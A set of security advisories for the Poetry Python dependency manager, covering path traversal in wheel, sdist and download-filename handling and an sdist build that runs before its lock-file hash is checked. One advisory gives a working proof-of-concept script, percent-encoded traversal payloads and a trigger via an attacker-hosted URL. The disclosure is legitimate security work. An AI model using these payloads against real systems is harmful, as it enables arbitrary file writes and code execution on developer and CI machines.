CVE-2026-34591.description: Poetry is a dependency manager for Python. From version 1.4.0 to before version 2.3.3, a crafted wheel can contain ../ paths that Poetry writes to disk without containment checks, allowing arbitrary file write with the privileges of the Poetry process. It is reachable from untrusted package artifacts during normal install flows. (Normally, installing a malicious wheel is not sufficient for execution of malicious code. Malicious code will only be executed after installation if the malicious package is imported or invoked by the user.). This issue has been patched in version 2.3.3.

CVE-2026-41140.description: Poetry is a dependency manager for Python. Prior to 2.3.4, the extractall() function in src/poetry/utils/helpers.py:410-426 extracts sdist tarballs without path traversal protection on Python versions where tarfile.data_filter is unavailable. Considering only Python versions which are still supported by Poetry, these are 3.10.0 - 3.10.12 and 3.11.0 - 3.11.4. This vulnerability is fixed in 2.3.4.

GHSA-8cvx-xgvx-6g8q.title: Path traversal in package download via percent-decoded link filename
GHSA-8cvx-xgvx-6g8q.description: ### Summary Poetry can write attacker-controlled download content **outside its artifact cache** when `Link.filename` is derived from a percent-encoded URL path (or an index-supplied `filename`). Taking `posixpath.basename` on a still-encoded path, then `urllib.parse.unquote`, turns sequences such as `%2e%2e%2f` into real `../`. The download path `cache_dir / link.filename` is not checked to stay under the cache directory. ### Impact Arbitrary file write (path traversal) from malicious or compromised package **URL** and/or **package index**. A malicious package is not sufficient to trigger this vulnerability because the URL or the JSON metadata of the package index has to be compromised. ### Details #### Root cause In `poetry-core`, `Link.filename` is computed as: ```python # poetry-core/src/poetry/core/packages/utils/link.py @cached_property def filename(self) -> str: _, netloc, path, _, _ = urlparse.urlsplit(self.url) name = posixpath.basename(path.rstrip('/')) or netloc name = urlparse.unquote(name) return name ``` Because `basename` runs **before** unquote on a percent-encoded path, a last segment like: `%2e%2e%2f%2e%2e%2foutside-1.0-py3-none-any.whl` has no raw `/`, so basename keeps the whole segment; unquote then yields: `../../outside-1.0-py3-none-any.whl` If `filename=` is set explicitly (e.g. PEP 691 JSON), that string is used as-is and is also not sanitized for `..` / separators / absolute paths. #### Dangerous sinks In `poetry`, downloaded archives are written using the unsanitized name: ```python # poetry/src/poetry/utils/cache.py — ArtifactCache.get_cached_archive_for_link cached_archive = cache_dir / link.filename cache_dir.mkdir(parents=True, exist_ok=True) download_func(link.url, cached_archive) ``` There is no post-unquote basename, and no `resolve()` + `is_relative_to(cache_dir)` (or equivalent) containment check. `download_file` writes the HTTP body via `atomic_open(dest)` to that path. Related joins of `link.filename`: - `poetry/src/poetry/repositories/http_repository.py` — `Path(temp_dir) / link.filename` - `poetry/src/poetry/packages/direct_origin.py` — URL dependencies via `get_cached_archive_for_link` - Install/executor paths that download through `ArtifactCache` #### Derived filename examples | URL last segment (encoded) | `Link.filename` | |----------------------------|-----------------| | `%2e%2e%2f%2e%2e%2foutside-1.0-py3-none-any.whl` | `../../outside-1.0-py3-none-any.whl` | | `%2Ftmp%2Fpwn-1.0-py3-none-any.whl` | `/tmp/pwn-1.0-py3-none-any.whl` (absolute on POSIX) | | `a%2Fb-1.0-py3-none-any.whl` | `a/b-1.0-py3-none-any.whl` | Full basename after unquote is attacker-controlled, **including the file extension** (`.whl`, `.py`, `.txt`, none, etc.). The download sink does not force a safe name or extension. ### PoC **Minimal local proof** (real `poetry-core` `Link` + same join as `ArtifactCache`). No public exploit server required. ```python from pathlib import Path from poetry.core.packages.utils.link import Link # Last path segment = percent-encoded ../../../../../../OUTSIDE_PWN.txt # (use enough '../' segments to escape a cache leaf like artifacts/aa/bb/cc/<hash>/) last = '%2e%2e%2f' * 6 + 'OUTSIDE_PWN.txt' url = f'https://evil.example/packages/{last}' link = Link(url) assert link.filename == '../../../../../../OUTSIDE_PWN.txt' # Simulate Poetry artifact cache leaf directory cache_dir = Path('/tmp/poetry-poc/cache/artifacts/aa/bb/cc/deadbeef0123456789') cache_dir.mkdir(parents=True, exist_ok=True) # Same pattern as ArtifactCache: # cached_archive = cache_dir / link.filename # download_func(url, cached_archive) dest = cache_dir / link.filename print('joined:', dest) print('resolved:', dest.resolve()) print('under cache_dir?', dest.resolve().is_relative_to(cache_dir.resolve())) # Parent of escaped path often already exists (e.g. /tmp/poetry-poc) # Real Poetry only mkdir's cache_dir, then atomic_open(dest) dest.write_bytes(b'ATTACKER_CONTROLLED_BYTES') print('wrote:', dest.resolve(), dest.resolve().exists()) ``` **Expected result:** - `link.filename` is `../../../../../../OUTSIDE_PWN.txt` (or equivalent depth). - `dest.resolve()` is **outside** `cache_dir` (e.g. under `/tmp/poetry-poc/OUTSIDE_PWN.txt`). - File content is attacker-controlled; extension is whatever was chosen in the encoded basename. **End-to-end trigger (optional):** 1. Host any file at a URL whose **last path segment** percent-encodes traversal, for example: `https://attacker.example/pkg/%2e%2e%2f%2e%2e%2f%2e%2e%2f...%2fpwn-1.0-py3-none-any.whl` 2. In a project, add a URL dependency, for example: `evil = { url = '<that URL>' }` 3. Set a temp `POETRY_CACHE_DIR` and run `poetry install` (or any flow that downloads via `get_cached_archive_for_link` with `download_func`). 4. Observe a file written outside `$POETRY_CACHE_DIR/artifacts/...` if the resolved parent path already exists. **Notes for reproduction:** - Encoding must be in the **last** URL path segment (so `basename` does not strip `../` before unquote). Real `/../` segments are collapsed by basename and do **not** demonstrate this bug. - File extension in the payload is fully controllable. - Write fails if intermediate parent directories of the escaped path do not exist (Poetry does not `mkdir -p` those parents).

GHSA-vqc6-rh9w-gvfc.title: `poetry install` builds a locked sdist before checking it against the lock file hash
GHSA-vqc6-rh9w-gvfc.description: ### Summary When `poetry install` installs a package from an sdist (index source or direct URL), the executor downloads the archive and runs the PEP 517 build (which executes code from the sdist) before it checks the archive against the hash recorded in `poetry.lock`. A tampered sdist is rejected with 'Hash for ... not found in known hashes', but only after its code has already run. ### Impact Locking with hashes exists to cover an index, mirror, proxy or cache that cannot be fully trusted. For sdists the check currently stops the installation, but not the code that runs during it: whoever controls the bytes served for a locked sdist (a compromised mirror or private index, a caching proxy, or a man-in-the-middle on an http source) gets code execution as the user running `poetry install`, for example on a CI runner with access to secrets. ### Details - `src/poetry/installation/executor.py` `_download_link`: the archive is fetched, then for a non-wheel archive `self._chef.prepare(archive, ...)` builds it, and only afterwards `self._populate_hashes_dict(original_archive, package)` calls `_validate_archive_hash`. - `_prepare_archive` (path dependencies) calls `_populate_hashes_dict` before `chef.prepare`, so the two paths use opposite orders. - The order has been in place since at least PR #7594 (validate the original archive instead of the built wheel); the review there did not discuss build order. #11030 (fail closed when a locked hash cannot be checked) and #11131 (match index hashes against per-file lock entries) treat lock hashes as an integrity control. ### Proof of concept Tested on Poetry 2.5.1 and current main (18668c8), Python 3.12, Windows, everything on 127.0.0.1. 1. Serve a PEP 503 index with `demopkg-1.0.tar.gz` (in-tree build backend, `backend-path = ['.']`) and the file's sha256 in the link fragment; `poetry lock` a project that depends on `demopkg==1.0`. 2. Keep the same index page (same advertised sha256) but serve a modified sdist whose backend writes a marker file; clear the artifact cache. 3. `poetry install`: the marker file is created, then the install fails with 'Hash for demopkg (1.0) from archive demopkg-1.0.tar.gz not found in known hashes'. Controls: a tampered wheel is rejected before install; with no advertised hash, or with the tampered file's real hash advertised, the chooser rejects the file before any build. PDM 2.29.7 on the same index rejects the tampered sdist before building. A variant where the server returns the legitimate bytes on the first request and the tampered bytes on the second also ran the backend.
